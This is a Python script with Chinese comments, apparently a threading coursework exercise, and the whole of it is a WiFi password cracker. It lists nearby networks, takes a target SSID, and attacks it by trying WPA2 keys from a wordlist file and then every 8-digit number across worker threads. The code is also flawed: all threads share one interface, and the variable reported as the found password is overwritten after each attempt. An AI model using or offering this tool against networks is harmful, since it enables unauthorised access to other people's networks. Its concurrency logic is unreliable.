from threading import Thread, Lock, Semaphore
import queue
import time
import pywifi
from pywifi import const
from asyncio.tasks import sleep
import itertools as its

q = queue.Queue(maxsize=0)
# characters = list("0123")
ssid = ""  #wifi名
testPwd = ""  #测试密码
res = ""  #与OS课本知识不同，单单做定义，线程之间并不直接共享，而要在使用处显示声明
findSema = Semaphore(0)  # 控制诸多线程寻找密钥情况
resSema = Semaphore(1)  # 同时只允许一个子线程汇报成功破解
wifi = pywifi.PyWiFi()  # 抓取网卡接口
thread_num = len(wifi.interfaces())  # 最优线程数为NCPU+1，故最优子线程数为NCPU
pwdSema = Semaphore(thread_num * 2)  # 控制当前队列中有多少个带尝试的密钥
wifi = pywifi.PyWiFi()
for ifaces in wifi.interfaces():
    ifaces.disconnect()  #断开所有连接

# time.sleep(1)
# def Iterator(num):
#     iterator = its.product(characters, repeat=num)
#     with open('D:\ 1.txt', 'w') as f:
#         for i in iterator:
#             string = i[0] + i[1] + i[2] + i[3] + "\n"

#         #f.write(i[0]+i[1]+i[2]+i[3]+"\n")


def getWifiList():

    ifaces = wifi.interfaces()[0]  # 抓取第一个无限网卡
    # print("**************************"+str(len(wifi.interfaces())))
    ifaces.disconnect()  # 测试链接断开所有链接
    time.sleep(1)
    results = ifaces.scan_results()  #扫描所有wifi
    for result in results:
        print("SSID: " + result.ssid + " 信号强度: " + str(result.signal))



def Connect(pwd):

    profile = pywifi.Profile()  # 创建wifi链接文件
    profile.ssid = ssid  # wifi名称
    profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放，
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
    profile.key = pwd  # 密码
    tmp_profile = ifaces.add_network_profile(profile)  # 设定新的链接文件
    ifaces.connect(tmp_profile)  # 链接
    time.sleep(1)
    if ifaces.status() == const.IFACE_CONNECTED:  # 判断是否连接上
        resSema.acquire()  #保证只有一个信号量的“结果正确”状态可以上交
        isOK = True
        print("Password is " + pwd)
    else:
        isOK = False
        print("Invalid Testing Password: " + pwd)

    return isOK


class productor(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.setDaemon(daemonic=True)  #子线程daemon属性为True，主线程运行结束时子线程将随主线程一起结束

    def run(self):
        pswd = ""

        with open("pwd.txt", 'r') as f:
            while (1):
                pwd = f.readline()[:-1]
                # print(pwd)
                if (len(pwd) == 0):
                    break
                q.put(pwd)
                # print("产生新密钥"+pwd)
                pwdSema.acquire()
        tryAllPassword(pswd, 8)


def tryAllPassword(currentPwd, n):
    if len(currentPwd) == n:
        # print(currentPwd)
        # f.write(currentPwd+"\n")
        q.put(currentPwd)
        # print("产生新密钥"+currentPwd)
        pwdSema.acquire()
        return
    for c in list("1234567890"):
        currentPwd += c
        tryAllPassword(currentPwd, n)
        currentPwd = currentPwd[:-1]


class comsumer(Thread):
    def __init__(self, threadID, name):
        Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.ifaces = wifi.interfaces()[threadID]  #获取第一个无线网卡
        self.setDaemon(daemonic=True)  #子线程daemon属性为True，主线程运行结束时子线程将随主线程一起结束

    def run(self):
        print("Starting " + self.name)
        while True:
            if not q.empty():
                s = q.get()  #Queue自带锁，是线程安全的
                # print(s)
                r = Connect(s)
                print("完成尝试，释放密钥队列位")
                pwdSema.release()  # 释放信号量以产生新的密钥
                global res  #先声明为全局变量
                res = s  #后使用
                if (r):
                    #print("connection")
                    findSema.release()
                    return
            else:
                print(self.name + "over!")
                return


if __name__ == '__main__':
    #for i in range(1000000):
    getWifiList()
    ssid = input("Please input your SSID:\n")
    testPwd = input("Please input your password:\n")
    # iterator = its.product(characters, repeat=2)
    # for i in iterator:
    #     string = i[0] + i[1] + "\n"
    #     q.put(string)

    q.put(testPwd)
    pwdSema.acquire()
    # print("产生新密钥"+testPwd)
    # 使用暴力破解——不可行

    proT = productor()
    proT.start()

    time_start = time.time()
    # print(time_start)
    for i in range(thread_num):
        t = comsumer(i, "Thread-" + str(i + 1))
        t.start()  #不能调用join阻塞主线程，因为主线程不必等待所有子线程完成
        # time.sleep(3)

    findSema.acquire()  #信号量同步

    time_end = time.time()
    print("Password Found! It is " + res + "\n")
    print('Totally Time Cost', time_end - time_start)
